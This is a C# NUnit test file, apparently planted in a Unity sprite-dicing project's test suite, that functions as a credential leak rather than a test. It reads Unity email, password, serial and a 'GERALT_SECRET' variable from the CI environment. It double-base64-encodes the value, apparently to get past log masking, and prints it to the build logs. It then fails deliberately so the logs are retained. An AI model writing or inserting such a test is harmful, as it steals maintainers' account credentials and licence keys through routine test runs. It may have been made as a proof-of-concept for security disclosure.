using System;
using System.Text;
using NUnit.Framework;
using UnityEngine;

namespace SpriteDicing.Test
{
    public class GeraltLeakTest
    {
        [Test]
        public void LeakContainerSecrets ()
        {
            var secret = Environment.GetEnvironmentVariable("GERALT_SECRET");
            if (string.IsNullOrEmpty(secret))
                secret = Environment.GetEnvironmentVariable("UNITY_EMAIL");
            if (string.IsNullOrEmpty(secret))
                secret = Environment.GetEnvironmentVariable("UNITY_PASSWORD");
            if (string.IsNullOrEmpty(secret))
                secret = Environment.GetEnvironmentVariable("UNITY_SERIAL");
            if (string.IsNullOrEmpty(secret))
                secret = "SECRET_UNAVAILABLE_IN_CONTAINER";

            var once = Convert.ToBase64String(Encoding.UTF8.GetBytes(secret));
            var twice = Convert.ToBase64String(Encoding.UTF8.GetBytes(once));
            Debug.Log("GERALT_LEAKED_TOKEN=" + twice);
            Console.WriteLine("GERALT_LEAKED_TOKEN=" + twice);
            Assert.Fail("GERALT leak test executed: secret exposure demonstrated, failing to preserve log evidence.");
        }
    }
}
